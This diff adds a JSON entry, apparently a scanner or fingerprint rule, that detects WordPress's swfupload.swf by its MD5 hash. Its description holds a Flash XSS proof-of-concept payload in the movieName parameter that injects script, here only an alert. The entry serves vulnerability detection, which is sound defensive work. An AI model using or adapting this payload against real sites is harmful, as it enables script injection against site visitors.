@@ -1,0 +1,23 @@
+{
+  "cms": "wordpress",
+  "version": "",
+  "author": "wolf",
+  "desc": "WordPress /wp-includes/js/swfupload/swfupload.swf 文件存在FlashXSS漏洞，POC：swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(/xss/)}}//",
+  "tags": [
+    "XSS"
+  ],
+  "refer": [
+    "",
+    ""
+  ],
+  "request": {
+    "path": "/wp-includes/js/swfupload/swfupload.swf",
+    "method": "POST",
+    "parameter": ""
+  },
+  "response": {
+    "position": "body",
+    "regex": false,
+    "match": "3a1c6cc728dddc258091a601f28a9c12"
+  }
+}
